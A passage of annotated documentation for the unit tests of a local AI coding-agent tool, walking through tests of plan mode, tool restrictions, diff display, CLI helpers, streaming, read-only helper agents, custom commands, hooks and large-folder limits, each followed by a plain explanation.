229 |         cfg = replace(Config(), workspace=Path(tmp), auto_format=False, **kw)
230 |         return Agent(cfg, backend, ToolBox(cfg, lambda _q: True), Meter())
231 | 
```
```python
232 |     def test_plan_mode_is_read_only(self):
233 |         with tempfile.TemporaryDirectory() as tmp:
234 |             backend = RecordingBackend([tool_call("write_file", path="x.py", content="x = 1\n"),
235 |                                         tool_call("finish", summary="1. create x.py")])
236 |             agent = self.make(tmp, backend)
237 |             self.assertEqual(agent.run("Create x.py", plan_only=True), "1. create x.py")
238 |             self.assertFalse((Path(tmp) / "x.py").exists())
239 |             self.assertNotIn("write_file", backend.offered[0])
240 |             self.assertIn("read_file", backend.offered[0])
241 |             self.assertIn(PLAN_ONLY_ERROR, [m["content"] for m in agent.messages])
242 |             self.assertTrue(agent.messages[1]["content"].startswith("PLAN MODE"))
243 | 
```
```python
244 |     def test_restricted_request_offers_only_allowed_tools(self):
245 |         with tempfile.TemporaryDirectory() as tmp:
246 |             backend = RecordingBackend([tool_call("run_tests"),
247 |                                         tool_call("write_file", path="AGENT.md", content="notes"),
248 |                                         tool_call("finish", summary="wrote notes")])
249 |             agent = self.make(tmp, backend)
250 |             answer = agent.run("Create AGENT.md", allowed=frozenset({"write_file"}))
251 |             self.assertEqual(answer, "wrote notes")
252 |             self.assertIn("write_file", backend.offered[0])
253 |             self.assertNotIn("run_tests", backend.offered[0])
254 |             self.assertIn(NOT_ALLOWED, [m["content"] for m in agent.messages])
255 |             self.assertTrue((Path(tmp) / "AGENT.md").is_file())
256 |             planner = RecordingBackend([tool_call("finish", summary="plan")])
257 |             self.make(tmp, planner).run("Plan it", plan_only=True)
258 |             self.assertIn("todo", planner.offered[0])                    # a checklist changes nothing
259 | 
```
```python
260 |     def test_repair_answers_unanswered_calls(self):
261 |         with tempfile.TemporaryDirectory() as tmp:
262 |             agent = self.make(tmp, FakeBackend([]))
263 |             agent.messages.append({"role": "assistant", "content": "", "tool_calls": [
264 |                 {"id": "c1", "function": {"name": "run_tests"}},
265 |                 {"id": "c2", "function": {"name": "read_file"}}]})
266 |             agent.messages.append({"role": "tool", "tool_call_id": "c1", "content": "done"})
267 |             self.assertEqual(agent.repair(), 1)
268 |             self.assertEqual(agent.messages[-1]["tool_call_id"], "c2")
269 |             self.assertEqual(agent.messages[-1]["content"], INTERRUPTED)
270 |             self.assertEqual(agent.repair(), 0)
271 |             fresh = self.make(tmp, FakeBackend([]))
272 |             fresh.restore(agent.messages[1:-1])                         # a "crashed" log
273 |             self.assertEqual(fresh.messages[-1]["content"], INTERRUPTED)
274 | 
```
```python
275 |     def test_edits_are_shown_as_a_diff(self):
276 |         with tempfile.TemporaryDirectory() as tmp:
277 |             script = [tool_call("write_file", path="a.txt", content="one\ntwo\n"),
278 |                       tool_call("edit_file", path="a.txt", old="two", new="TWO"),
279 |                       {"role": "assistant", "content": "ok"}]
280 |             events: list[str] = []
281 |             agent = self.make(tmp, FakeBackend(script))
282 |             agent.run("Make a.txt", on_event=events.append)
283 |             for line in ("     +one", "     -two", "     +TWO", "     @@ -1,2 +1,2 @@"):
284 |                 self.assertIn(line, events)
285 |             self.assertFalse(any(e.strip().startswith("+++") for e in events))   # header dropped
286 |             tool_text = " ".join(m["content"] for m in agent.messages if m["role"] == "tool")
287 |             self.assertNotIn("+TWO", tool_text)                          # the model never sees it
288 |             short: list[str] = []
289 |             capped = self.make(tmp, FakeBackend([tool_call("write_file", path="b.txt",
290 |                                                            content="1\n2\n3\n4\n"),
291 |                                                  {"role": "assistant", "content": "ok"}]),
292 |                                diff_lines=2)
293 |             capped.run("Make b.txt", on_event=short.append)
294 |             self.assertIn("     ... 3 more diff lines", short)
295 | 
296 | 
```
- **Plan mode:** `write_file` is not offered (but `read_file` is); when the model calls it anyway it gets
  `PLAN_ONLY_ERROR`, no file appears, the request was stored with the plan prefix, and the plan is returned.
- **Restricted request** (how `/init` works): with `allowed={write_file}` the model is offered `write_file` but not
  `run_tests`; calling `run_tests` anyway gets `NOT_ALLOWED`; writing `AGENT.md` and finishing works. Plan mode now offers
  the `todo` checklist.
- **Repair:** of two calls only one has a result; `repair` adds `INTERRUPTED` for the other, a second repair finds
  nothing; restoring a "crashed" log repairs it automatically.
- **Diffs:** writing then editing a file shows `+one`, `-two`, `+TWO` and the hunk header on screen, without the
  `+++` header, and none of it reaches the model's tool results; with `diff_lines=2` a 4-line new file shows
  `... 3 more diff lines`.

## CLI helpers
```python
297 | class CliHelperTests(unittest.TestCase):
```
```python
298 |     def test_multiline_input(self):
299 |         lines = iter(["first \\", "second"])
300 |         self.assertEqual(read_request(lambda _p: next(lines)), "first \nsecond")
301 |         block = iter(['"""', "a", "", "b", '"""'])
302 |         self.assertEqual(read_request(lambda _p: next(block)), "a\n\nb")
303 |         self.assertEqual(read_request(lambda _p: "﻿/init"), "/init")   # piped byte-order mark
304 | 
```
```python
305 |     def test_session_logs_belong_to_the_project(self):
306 |         project = Path("C:/work/shop") if os.name == "nt" else Path("/work/shop")
307 |         config = replace(Config(), workspace=project)
308 |         self.assertEqual(sessions_folder(config), project / ".localagent" / "sessions")
309 |         elsewhere = project.parent / "logs"                            # an absolute choice wins
310 |         self.assertEqual(sessions_folder(replace(config, state_dir=elsewhere)), elsewhere / "sessions")
311 | 
```
```python
312 |     def test_shared_setup_helpers(self):
313 |         base = Config()
314 |         self.assertEqual(overlay(base, model=None, sandbox="docker"), replace(base, sandbox="docker"))
315 |         with mock.patch.dict(os.environ, {}, clear=False):
316 |             os.environ.pop("LOCALAGENT_NUM_CTX", None)
317 |             gemini = replace(base, backend="gemini")
318 |             self.assertEqual(gemini_history(gemini).num_ctx, GEMINI_CONTEXT)
319 |             self.assertEqual(gemini_history(gemini, chosen=True).num_ctx, base.num_ctx)
320 |             self.assertEqual(gemini_history(base).num_ctx, base.num_ctx)       # local models keep 8K
321 |             os.environ["LOCALAGENT_NUM_CTX"] = "4096"                         # set by the user
322 |             self.assertEqual(gemini_history(gemini).num_ctx, base.num_ctx)
323 |         self.assertEqual(shell_argv("x")[-1], "x")
324 |         self.assertEqual(shell_argv("x")[0], "powershell" if os.name == "nt" else "sh")
325 | 
```
```python
326 |     def test_todo_understands_done_written_in_the_text(self):
327 |         with tempfile.TemporaryDirectory() as tmp:
328 |             box = ToolBox(replace(Config(), workspace=Path(tmp)), lambda _q: True)
329 |             out = box.call("todo", {"items": ["read files (done)", "[x] write code",
330 |                                               {"text": "run tests", "done": True}, "finish"]})
331 |             self.assertEqual(out.splitlines()[0], "TODO 3/4 done")
332 |             self.assertIn("  [x] read files", out)
333 |             self.assertIn("  [x] write code", out)
334 |             self.assertIn("  [ ] finish", out)
335 | 
```
```python
336 |     def test_approver_always_saves_a_rule(self):
337 |         with tempfile.TemporaryDirectory() as tmp:
338 |             project = Path(tmp) / "settings.json"
339 |             approver = Approver(read=lambda _p: "a")
340 |             approver.permissions = Permissions(project_file=project)
341 |             with contextlib.redirect_stdout(io.StringIO()):
342 |                 self.assertTrue(approver(Approval("run x", "run_shell", "git status")))
343 |             self.assertEqual(approver.permissions.allow, ["run_shell(git status)"])
344 |             self.assertIn("run_shell(git status)", project.read_text(encoding="utf-8"))
345 |             self.assertFalse(Approver(read=lambda _p: "")("anything"))
346 |             self.assertTrue(Approver(read=lambda _p: "YES")("anything"))
347 | 
```
```python
348 |     def test_auto_configure_uses_what_is_available(self):
349 |         args = build_parser().parse_args([])
350 |         clean = {k: v for k, v in os.environ.items()
351 |                  if k not in ("LOCALAGENT_BACKEND", "LOCALAGENT_SANDBOX", "LOCALAGENT_NUM_CTX")}
352 |         with mock.patch.dict(os.environ, clean, clear=True), \
353 |                 mock.patch("localagent.cli.sandbox_image_ready", return_value=True), \
354 |                 mock.patch("localagent.cli.server_up", return_value=True):
355 |             config, notes = auto_configure(replace(Config(), gemini_api_key="k"), args)
356 |         self.assertEqual((config.backend, config.sandbox, config.fallback_backend, config.num_ctx),
357 |                          ("gemini", "docker", "openai", 32_768))
358 |         self.assertEqual(len(notes), 4)
359 |         explicit = build_parser().parse_args(["--backend", "ollama", "--sandbox", "local"])
360 |         with mock.patch("localagent.cli.sandbox_image_ready", return_value=True):
361 |             config, notes = auto_configure(replace(Config(), gemini_api_key="k"), explicit)
362 |         self.assertEqual((config.backend, config.sandbox, notes), ("ollama", "local", []))
363 | 
```
```python
364 |     def test_ctrl_c_keeps_the_conversation_usable(self):
365 |         class Interrupting:
366 |             def chat(self, messages, tools, on_token=None):
367 |                 raise KeyboardInterrupt
368 | 
369 |         with tempfile.TemporaryDirectory() as tmp:
370 |             cfg = replace(Config(), workspace=Path(tmp))
371 |             box = ToolBox(cfg, lambda _q: True)
372 |             agent = Agent(cfg, Interrupting(), box, Meter())
373 |             out = io.StringIO()
374 |             with contextlib.redirect_stdout(out):
375 |                 self.assertEqual(handle_request(agent, box, Meter(), "hello"), "")
376 |             self.assertIn("stopped", out.getvalue())
377 | 
378 | 
```
- A `\`-continued line and a `"""` block are read as multi-line requests; a leading byte-order mark is removed.
- Conversation logs go to `<project>/.localagent/sessions` whatever folder the agent was started from; an absolute
  `state_dir` is used as given.
- The shared helpers: `overlay` skips `None`; `gemini_history` gives Gemini 32K but keeps 8K when the size was chosen
  (flag or `LOCALAGENT_NUM_CTX`, set inside `mock.patch.dict` so the real environment is restored) or the model is
  local; `shell_argv` picks PowerShell on Windows and `sh` elsewhere.
- Checklist items marked `(done)` in the text or starting with `[x]`, or with `done: true`, count as done (`3/4`).
- Answering `a` saves `run_shell(git status)` in memory and in the project file; Enter refuses; `YES` allows.
- With a key, a ready sandbox image and a running local server (simulated with `mock.patch`), automatic setup picks
  gemini + docker + the local fallback + the 32K history budget with four notes; explicit flags are never overridden.
- A model call interrupted by Ctrl+C returns an empty answer and prints the "stopped" message instead of crashing.

## Limits and hints
```python
379 | class LimitsAndHintsTests(unittest.TestCase):
```
```python
380 |     def test_learned_rpm_is_saved_for_other_runs(self):
381 |         with tempfile.TemporaryDirectory() as tmp:
382 |             usage = Path(tmp) / "usage.json"
383 |             RateLimiter("m", rpm=12, tpm=10_000, rpd=100, usage_file=usage).set_rpm(4)
384 |             later = RateLimiter("m", rpm=12, tpm=10_000, rpd=100, usage_file=usage)
385 |             later.before_call(10)
386 |             self.assertEqual(later._rpm, 4)
387 | 
```
```python
388 |     @unittest.skipUnless(importlib.util.find_spec("ruff"), "ruff not installed")
389 |     def test_undefined_name_rejection_suggests_editing_together(self):
390 |         with tempfile.TemporaryDirectory() as tmp:
391 |             box = ToolBox(replace(Config(), workspace=Path(tmp)), lambda _q: True)
392 |             result = box.call("write_file", {"path": "m.py", "content": "print(missing)\n"})
393 |             self.assertIn(TOGETHER_HINT, result)
394 | 
395 | 
```
- A per-minute limit learned by one limiter is used by a new limiter reading the same usage file.
- With ruff installed, a write rejected for an undefined name carries the "edit together" hint.

```python
396 | if __name__ == "__main__":
397 |     unittest.main()
```
- Lets you run the file directly.

---
# `tests/test_phase9.py` — many languages, streaming, helpers, custom commands, tiers, big folders

**Role:** proves the breadth features. Language tests run each checker only when its program is installed (this PC has
Node, Go, Rust, gcc/g++ and PowerShell, so they all ran); everything else uses fakes and temporary folders.

## Helpers
```python
  1 | """Tests for many languages, streaming, helper agents, custom commands, tiers and big folders."""
  2 | import contextlib
  3 | import io
  4 | import os
  5 | import shutil
  6 | import tempfile
  7 | import time
  8 | import unittest
  9 | from dataclasses import replace
 10 | from pathlib import Path
 11 | from unittest import mock
 12 | 
 13 | from localagent.agent import DELEGATE_SPEC, Agent
 14 | from localagent.backends import make_gemini
 15 | from localagent.checkpoint import Checkpoints
 16 | from localagent.cli import handle_request
 17 | from localagent.config import Config
 18 | from localagent.meter import Meter
 19 | from localagent.openai_compat import read_stream
 20 | from localagent.settings import expand_command, load_commands
 21 | from localagent.tools import MAX_SEARCH_FILES, ToolBox
 22 | from localagent.verify import CHECKED_SUFFIXES, verify_file
 23 | 
 24 | from .test_agent import tool_call
 25 | from .test_phase8 import RecordingBackend
 26 | 
 27 | SAMPLES = {   # suffix: (program needed, valid text, broken text)
 28 |     ".ts": ("node", "enum C { A }\nconst x: number = 1;\nexport function f(a: string): string { return a; }\n",
 29 |             "function f(x: number { return x; }\n"),
 30 |     ".go": ("gofmt", "package main\n\nfunc main() {}\n", "package main\nfunc main( {}\n"),
 31 |     ".rs": ("rustfmt", "fn main() { let _x = 1; }\n", "fn main() { let x = ; }\n"),
 32 |     ".c": ("gcc", "int main(void) { return 0; }\n", "int main(void) { return 0 }\n"),
 33 |     ".cpp": ("g++", "int main() { return 0; }\n", "int main() { return 0 }\n"),
 34 |     ".ps1": ("powershell", 'Write-Output "hi"\n', "function f( {\n"),
 35 | }
 36 | 
 37 | 
```
- `SAMPLES` holds, per extension, the program needed, a valid file and a broken one (TypeScript with an `enum`, Go,
  Rust, C, C++, PowerShell).

```python
 38 | def check(folder: str, name: str, text: str) -> bool:
 39 |     path = Path(folder) / name
 40 |     path.write_text(text, encoding="utf-8")
 41 |     return verify_file(path, Path(folder)).ok
 42 | 
 43 | 
```
- Writes a file into a folder and returns whether `verify_file` accepts it.

## Languages
```python
 44 | class LanguageTests(unittest.TestCase):
```
```python
 45 |     def test_each_installed_language_checker(self):
 46 |         for suffix, (program, good, bad) in SAMPLES.items():
 47 |             with self.subTest(suffix=suffix):
 48 |                 if not shutil.which(program) or (suffix == ".ps1" and os.name != "nt"):
 49 |                     self.skipTest(f"{program} not installed")
 50 |                 with tempfile.TemporaryDirectory() as tmp:
 51 |                     self.assertTrue(check(tmp, "good" + suffix, good))
 52 |                     self.assertFalse(check(tmp, "bad" + suffix, bad))
 53 | 
```
```python
 54 |     def test_missing_outside_header_is_not_an_error(self):
 55 |         if not shutil.which("gcc"):
 56 |             self.skipTest("gcc not installed")
 57 |         with tempfile.TemporaryDirectory() as tmp:
 58 |             self.assertTrue(check(tmp, "uses_lib.c", '#include "not_here.h"\nint main(void){return 0;}\n'))
 59 | 
```
```python
 60 |     def test_unknown_and_tool_less_files_pass(self):
 61 |         with tempfile.TemporaryDirectory() as tmp:
 62 |             self.assertTrue(check(tmp, "notes.txt", "anything {"))
 63 |             with mock.patch("localagent.verify.shutil.which", return_value=None):
 64 |                 self.assertTrue(check(tmp, "x.go", "this is not go"))   # no gofmt -> skipped
 65 |         self.assertTrue({".ts", ".go", ".rs", ".c", ".ps1", ".yaml"} <= CHECKED_SUFFIXES)
 66 | 
 67 | 
```
- For every installed language: the valid file passes, the broken one fails (`subTest` reports each language
  separately; missing programs are skipped).
- A C file that includes a header which does not exist here passes (it cannot be checked without that library).
- An unknown file type passes; with the program "uninstalled" (a mock), even a nonsense `.go` file passes — checks are
  skipped, never failed, when their tool is missing. The checked-extension list includes the new languages.

## Streaming
```python
 68 | class StreamTests(unittest.TestCase):
```
```python
 69 |     def lines(self, *events: str) -> list[bytes]:
 70 |         return [f"data: {e}\n".encode() for e in events] + [b"\n", b"data: [DONE]\n"]
 71 | 
```
```python
 72 |     def test_text_and_tool_calls_are_assembled(self):
 73 |         pieces: list[str] = []
 74 |         message, usage = read_stream(self.lines(
 75 |             '{"choices":[{"delta":{"content":"Hel"}}]}',
 76 |             ': keep-alive comment',
 77 |             '{"choices":[{"delta":{"content":"lo"}}]}',
 78 |             '{"choices":[{"delta":{"tool_calls":[{"index":0,"id":"c1","function":{"name":"read_",'
 79 |             '"arguments":"{\\"pa"}}]}}]}',
 80 |             '{"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"name":"file",'
 81 |             '"arguments":"th\\": \\"a\\"}"},"extra_content":{"google":{"thought_signature":"S"}}}]}}]}',
 82 |             '{"choices":[],"usage":{"prompt_tokens":9,"completion_tokens":4}}',
 83 |         ), pieces.append)
 84 |         self.assertEqual(pieces, ["Hel", "lo"])
 85 |         self.assertEqual(message["content"], "Hello")
 86 |         call = message["tool_calls"][0]
 87 |         self.assertEqual((call["id"], call["function"]["name"]), ("c1", "read_file"))
 88 |         self.assertEqual(call["function"]["arguments"], '{"path": "a"}')
 89 |         self.assertEqual(call["extra_content"]["google"]["thought_signature"], "S")
 90 |         self.assertEqual(usage["prompt_tokens"], 9)
 91 | 
```
```python
 92 |     def test_error_inside_a_stream(self):
 93 |         from localagent.llm import LLMError
 94 |         with self.assertRaises(LLMError):
 95 |             read_stream(self.lines('{"error":{"message":"overloaded"}}'), None)
 96 | 
```
```python
 97 |     def test_summary_is_printed_when_streamed_text_differs(self):
 98 |         class Streaming:
 99 |             def chat(self, messages, tools, on_token=None):
100 |                 on_token("Working on it.")
101 |                 from localagent.llm import Reply
102 |                 return Reply({"role": "assistant", "content": "Working on it.", "tool_calls": [
103 |                     {"function": {"name": "finish", "arguments": {"summary": "All done: 3 files."}}}]},
104 |                     1, 1, 0.0)
105 | 
106 |         with tempfile.TemporaryDirectory() as tmp:
107 |             cfg = replace(Config(), workspace=Path(tmp))
108 |             box = ToolBox(cfg, lambda _q: True)
109 |             out = io.StringIO()
110 |             with contextlib.redirect_stdout(out):
111 |                 handle_request(Agent(cfg, Streaming(), box, Meter()), box, Meter(), "Why?")
112 |             self.assertIn("Working on it.", out.getvalue())
113 |             self.assertIn("All done: 3 files.", out.getvalue())
114 | 
115 | 
```
- `lines` turns event texts into `data: ...` lines ending with `[DONE]`, as a server sends them.
- Two text pieces become "Hello" and reach the display in order; a comment line is ignored; a tool call split over two
  chunks (name `read_` + `file`, argument text in two halves) is glued back together with its id and thought
  signature; the token counts from the last chunk are returned.
- An error object inside the stream raises `LLMError`.
- When the model streams "Working on it." but finishes with the summary "All done: 3 files.", both appear on screen.

## Helper agents
```python
116 | class HelperTests(unittest.TestCase):
```
```python
117 |     def test_delegate_runs_a_read_only_helper_and_returns_its_report(self):
118 |         with tempfile.TemporaryDirectory() as tmp:
119 |             (Path(tmp) / "a.py").write_text("def invoice_total():\n    return 1\n", encoding="utf-8")
120 |             script = [tool_call("delegate", task="find invoice code"),             # main agent
121 |                       tool_call("write_file", path="x.py", content="x = 1\n"),     # helper tries
122 |                       tool_call("search", pattern="invoice"),                       # helper reads
123 |                       tool_call("finish", summary="invoice_total is in a.py line 1"),
124 |                       tool_call("finish", summary="Found it")]                     # main agent
125 |             backend = RecordingBackend(script)
126 |             cfg = replace(Config(), workspace=Path(tmp))
127 |             meter = Meter()
128 |             agent = Agent(cfg, backend, ToolBox(cfg, lambda _q: True), meter)
129 |             events: list[str] = []
130 |             self.assertEqual(agent.run("Where is the invoice code?", on_event=events.append), "Found it")
131 |             self.assertIn("delegate", backend.offered[0])                 # main agent may delegate
132 |             self.assertNotIn("delegate", backend.offered[1])              # a helper may not
133 |             self.assertNotIn("write_file", backend.offered[1])            # helpers only read
134 |             self.assertFalse((Path(tmp) / "x.py").exists())
135 |             report = [m["content"] for m in agent.messages if m["role"] == "tool"][0]
136 |             self.assertIn("HELPER REPORT:", report)
137 |             self.assertIn("invoice_total is in a.py", report)
138 |             self.assertEqual(meter.calls, 5)                              # helper calls are counted
139 |             self.assertTrue(any(e.startswith("   | ") for e in events))
140 |             self.assertEqual(DELEGATE_SPEC["function"]["name"], "delegate")
141 | 
```
```python
142 |     def test_helper_leaves_the_main_routing_alone(self):
143 |         class Routing(RecordingBackend):
144 |             def __init__(self, messages):
145 |                 super().__init__(messages)
146 |                 self.resets = self.escalations = 0
147 | 
148 |             def reset_route(self):
149 |                 self.resets += 1
150 | 
151 |             def escalate(self):
152 |                 self.escalations += 1
153 |                 return True
154 | 
155 |         with tempfile.TemporaryDirectory() as tmp:
156 |             bad = tool_call("read_file", path="missing.txt")              # fails: no such file
157 |             backend = Routing([tool_call("delegate", task="look"), bad, bad,
158 |                                tool_call("finish", summary="nothing found"),
159 |                                tool_call("finish", summary="done")])
160 |             cfg = replace(Config(), workspace=Path(tmp))
161 |             Agent(cfg, backend, ToolBox(cfg, lambda _q: True), Meter()).run("Where is X?")
162 |             self.assertEqual(backend.resets, 1)                           # only the main agent
163 |             self.assertEqual(backend.escalations, 0)                      # helper trouble ignored
164 | 
```
```python
165 |     def test_helpers_can_be_switched_off(self):
166 |         with tempfile.TemporaryDirectory() as tmp:
167 |             backend = RecordingBackend([{"role": "assistant", "content": "ok"}])
168 |             cfg = replace(Config(), workspace=Path(tmp), helpers=False)
169 |             Agent(cfg, backend, ToolBox(cfg, lambda _q: True), Meter()).run("hi")
170 |             self.assertNotIn("delegate", backend.offered[0])
171 | 
172 | 
```
- The main agent calls `delegate`; the helper is offered neither `delegate` nor `write_file`, its write attempt is
  refused, it searches and finishes; the main agent receives `HELPER REPORT: ...` and finishes. All 5 model calls are
  counted by the shared meter and the helper's steps are shown with `|`.
- A helper whose reads keep failing neither resets nor escalates the shared model chain: only the main agent's one
  reset at the start of its request is seen.
- With `helpers=False` the tool is not offered.

## Commands and tiers
```python
173 | class CommandAndTierTests(unittest.TestCase):
```
```python
174 |     def test_custom_commands_load_and_expand(self):
175 |         with tempfile.TemporaryDirectory() as tmp:
176 |             user = Path(tmp) / "user"
177 |             user.mkdir()
178 |             (user / "review.md").write_text("Review $ARGUMENTS for bugs.", encoding="utf-8")
179 |             (user / "Bad Name!.md").write_text("ignored", encoding="utf-8")
180 |             project = Path(tmp) / ".localagent" / "commands"
181 |             project.mkdir(parents=True)
182 |             (project / "review.md").write_text("Project review of $ARGUMENTS.", encoding="utf-8")
183 |             (project / "docs.md").write_text("Write docs.", encoding="utf-8")
184 |             commands = load_commands(Path(tmp), user)
185 |             self.assertEqual(sorted(commands), ["docs", "review"])           # project wins
186 |             self.assertEqual(expand_command(commands["review"], "app.py"), "Project review of app.py.")
187 |             self.assertEqual(expand_command(commands["docs"], "for api.py"), "Write docs.\n\nfor api.py")
188 |             self.assertEqual(expand_command(commands["docs"], ""), "Write docs.")
189 | 
```
```python
190 |     def test_paid_tier_puts_strong_models_first_with_higher_limits(self):
191 |         with mock.patch.dict(os.environ, {"LOCALAGENT_GEMINI_TIER": "paid", "GEMINI_API_KEY": "k"}):
192 |             cfg = Config.from_env()
193 |         self.assertEqual((cfg.gemini_tier, cfg.rpm, cfg.rpd), ("paid", 1000, 10_000))
194 |         backend = make_gemini(cfg)
195 |         order = [e.name for e in backend._order()]
196 |         self.assertEqual(order[: len(cfg.gemini_strong_models)], list(cfg.gemini_strong_models))
197 |         self.assertFalse(backend.escalate())                                 # no reserve on paid
198 |         with mock.patch.dict(os.environ, {"LOCALAGENT_RPM": "7"}):
199 |             self.assertEqual(Config.from_env().rpm, 7)
200 | 
201 | 
```
- A user and a project `review.md`: the project one wins; a file with an invalid name is ignored; `$ARGUMENTS` is
  replaced, or the words are appended when the file has no placeholder.
- `LOCALAGENT_GEMINI_TIER=paid` gives 1000 requests/minute and 10 000/day, puts the strong models first and leaves no
  reserve to escalate to; `LOCALAGENT_RPM` overrides the limit directly.

## Big folders
```python
202 | class HookTests(unittest.TestCase):
```
```python
203 |     def test_after_edit_failure_reaches_the_model_and_after_request_runs(self):
204 |         with tempfile.TemporaryDirectory() as tmp:
205 |             hooks = {"after_edit": 'echo "checked {file}"; exit 3', "after_request": 'echo "all tests ok"'}
206 |             box = ToolBox(replace(Config(), workspace=Path(tmp)), lambda _q: True, {"hooks": hooks})
207 |             result = box.call("write_file", {"path": "n.txt", "content": "hi"})
208 |             self.assertTrue(result.startswith("OK: wrote n.txt"))
209 |             self.assertIn("HOOK after_edit failed (exit code 3)", result)
210 |             self.assertIn("checked n.txt", result)
211 |             code, output = box.run_hook("after_request")
212 |             self.assertEqual((code, output.strip()), (0, "all tests ok"))
213 |             self.assertIsNone(ToolBox(replace(Config(), workspace=Path(tmp))).run_hook("after_edit"))
214 | 
```
```python
215 |     def test_hooks_merge_from_settings_files(self):
216 |         with tempfile.TemporaryDirectory() as tmp:
217 |             user = Path(tmp) / "user.json"
218 |             user.write_text('{"hooks": {"after_edit": "a", "after_request": "b"}}', encoding="utf-8")
219 |             project = Path(tmp) / ".localagent" / "settings.json"
220 |             project.parent.mkdir()
221 |             project.write_text('{"hooks": {"after_edit": "c"}}', encoding="utf-8")
222 |             from localagent.settings import load_settings
223 |             self.assertEqual(load_settings(Path(tmp), user)["hooks"],
224 |                              {"after_edit": "c", "after_request": "b"})
225 | 
226 | 
```
- A failing `after_edit` hook (it prints the file name and exits 3) leaves the write in place but appends
  `HOOK after_edit failed (exit code 3)` and its output to the result; `after_request` runs and returns its output;
  without hooks nothing runs. (The test command quotes its text so PowerShell and `sh` print it identically.)
- Hooks merge from the user and project settings files, the project winning per hook.

```python
227 | class BigFolderTests(unittest.TestCase):
```
```python
228 |     def test_snapshots_switch_off_once_for_huge_folders(self):
229 |         with tempfile.TemporaryDirectory() as tmp:
230 |             for i in range(5):
231 |                 (Path(tmp) / f"f{i}.txt").write_text("x", encoding="utf-8")
232 |             snaps = Checkpoints(Path(tmp), max_files=3)
233 |             first = snaps.take()
234 |             self.assertIn("/undo is off", first or "")
235 |             self.assertIsNone(snaps.take())                                  # said only once
236 |             self.assertTrue(snaps.undo().startswith("undo is off"))
237 |             self.assertIsNone(Checkpoints(Path(tmp)).take())                 # normal size: fine
238 | 
```
```python
239 |     def test_workspace_check_can_look_only_at_recent_changes(self):
240 |         with tempfile.TemporaryDirectory() as tmp:
241 |             old = Path(tmp) / "old.json"
242 |             old.write_text("{broken", encoding="utf-8")
243 |             past = time.time() - 3600
244 |             os.utime(old, (past, past))                                      # broken long ago
245 |             box = ToolBox(replace(Config(), workspace=Path(tmp)), lambda _q: True)
246 |             self.assertEqual(len(box.check_workspace()), 1)
247 |             self.assertEqual(box.check_workspace(since=time.time() - 60), [])
248 |             (Path(tmp) / "new.json").write_text("{also broken", encoding="utf-8")
249 |             self.assertEqual(len(box.check_workspace(since=box.started)), 1)
250 |             self.assertIn("NOT RUN", box.call("run_tests", {}))             # broken this session
251 |             (Path(tmp) / "new.json").unlink()
252 |             self.assertIn("exit code", box.call("run_tests", {}))           # old file does not block
253 | 
```
```python
254 |     def test_search_stops_on_enormous_folders(self):
255 |         self.assertGreaterEqual(MAX_SEARCH_FILES, 1000)
256 |         with tempfile.TemporaryDirectory() as tmp:
257 |             for i in range(3):
258 |                 (Path(tmp) / f"m{i}.py").write_text("x = 1\n", encoding="utf-8")
259 |             box = ToolBox(replace(Config(), workspace=Path(tmp)), lambda _q: True)
260 |             with mock.patch("localagent.tools.MAX_SEARCH_FILES", 2):
261 |                 self.assertIn("stopped after looking at 2 files", box.call("search", {"pattern": "zzz"}))
262 | 
263 | 
```
- With a 3-file limit, a 5-file folder switches `/undo` off with one message (the next snapshot is silent and `undo`
  explains why); a normal folder snapshots fine.
- A file broken an hour ago is found by a full check but not by a check of recent changes; a file broken now blocks
  `run_tests`; once it is gone, the old broken file does not block the tests.
- With the file limit lowered to 2 (a mock), a search stops with the "narrow the search" note.

```python
264 | if __name__ == "__main__":
265 |     unittest.main()
```
- Lets you run the file directly.

---
# `tests/test_phase10.py` — version 0.6: safety, faithful edits, offline/online, the Claude-Code-style chat

**Role:** proves every fix and feature of version 0.6. Each class below starts from a problem that was **reproduced
first** (a probe script showed the old behaviour) and then fixed; the test pins the fixed behaviour so it cannot
return. 59 tests, about 11 seconds, no model and no internet needed.

## Helpers
```python
  1 | """Tests for version 0.6: safety fixes, faithful edits, smarter context, the online/offline
  2 | modes, the local model server and the Claude-Code-style chat features."""
  3 | import contextlib
  4 | import importlib.util
  5 | import io
  6 | import json
  7 | import os
  8 | import shutil
  9 | import socket
 10 | import subprocess
 11 | import sys
 12 | import tempfile
 13 | import time
 14 | import unittest
 15 | from dataclasses import replace
 16 | from datetime import datetime, timezone
 17 | from pathlib import Path
 18 | from unittest import mock
 19 | 
 20 | from localagent import cli, localserver, runners
 21 | from localagent.agent import BAD_ARGUMENTS, EMPTY_REPLY, EMPTY_TWICE, Agent, _wants_change
 22 | from localagent.backends import make_backend, make_gemini
 23 | from localagent.checkpoint import Checkpoints
 24 | from localagent.config import Config
 25 | from localagent.context import project_tree
 26 | from localagent.llm import REMOVED, SHORTENED, LLMError, fit_history, message_size
 27 | from localagent.localserver import LlamaServer, LocalModel
 28 | from localagent.meter import Meter
 29 | from localagent.ratelimit import RateLimiter, _pacific_offset, pacific_day, shared_limiter
 30 | from localagent.resilient import OFFLINE_HELP, Entry, FallbackBackend
 31 | from localagent.sandbox import looks_binary, project_files, quote_for_shell, run_command, skip_dir
 32 | from localagent.session import SessionLog, load_session, session_title
 33 | from localagent.settings import (Permissions, apply_env, command_parts, escape_pattern,
 34 |                                  load_settings, suggest_rule)
 35 | from localagent.tools import ToolBox
 36 | from localagent.verify import strip_jsonc, verify_file
 37 | 
 38 | from .test_agent import FakeBackend, tool_call
 39 | from .test_phase2 import FakeServer
 40 | from .test_phase4 import ScriptedBackend, reply
 41 | 
 42 | ROOT = Path(__file__).resolve().parent.parent
 43 | _SPEC = importlib.util.spec_from_file_location("check_commit", ROOT / "tools" / "check_commit.py")
 44 | assert _SPEC is not None and _SPEC.loader is not None
 45 | check_commit = importlib.util.module_from_spec(_SPEC)
 46 | _SPEC.loader.exec_module(check_commit)
 47 | FAKE_LLAMA = r'''
 48 | import json, sys, time
 49 | from http.server import BaseHTTPRequestHandler, HTTPServer
 50 | port = int(sys.argv[sys.argv.index("--port") + 1])
 51 | born = time.time()
 52 | 
 53 | class Handler(BaseHTTPRequestHandler):
 54 |     def answer(self, code, body):
 55 |         data = json.dumps(body).encode()
 56 |         self.send_response(code)
 57 |         self.send_header("Content-Length", str(len(data)))
 58 |         self.end_headers()
 59 |         self.wfile.write(data)
 60 | 
 61 |     def do_GET(self):
 62 |         loaded = time.time() - born > 0.3                      # "loading" for a moment
 63 |         self.answer(200 if loaded else 503, {"status": "ok"} if loaded else {"error": "loading"})
 64 | 
 65 |     def do_POST(self):
